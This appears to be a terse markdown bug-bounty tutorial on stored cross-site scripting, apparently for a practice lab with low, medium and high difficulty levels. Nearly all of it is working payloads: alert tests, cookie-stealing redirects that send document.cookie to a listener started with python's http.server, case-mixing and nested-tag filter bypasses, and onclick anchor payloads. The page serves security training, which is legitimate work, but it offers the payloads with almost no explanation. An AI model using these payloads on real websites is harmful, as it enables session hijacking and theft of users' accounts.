# bug-bounty-tutorial
bug bounty tutorial

## 18.XSS-store

### clear send to burp suite repeater

### low in name & message
```
python3 -m http.server 3000
<script>alert("XSS");</script>
```
### change textarea size
```
<script>window.location="http://127.0.0.1:3000/?cookie="+document.cookie</script>
```
### medium
### change input size
```
<ScRipT>window.location="http://127.0.0.1:3000/?cookie="+document.cookie</script>
<scr<script>ipt>window.location="http://127.0.0.1:3000/?cookie="+document.cookie</script>
<scr<script>ipt>alert(document.cookie)</script>
```

### high
### burp suite
### ctrl u encode url
```
<a onclick="alert(1)" style=display:block>test</a>
<a onclick="alert(document.cookie)" style=display:block>test</a>
```
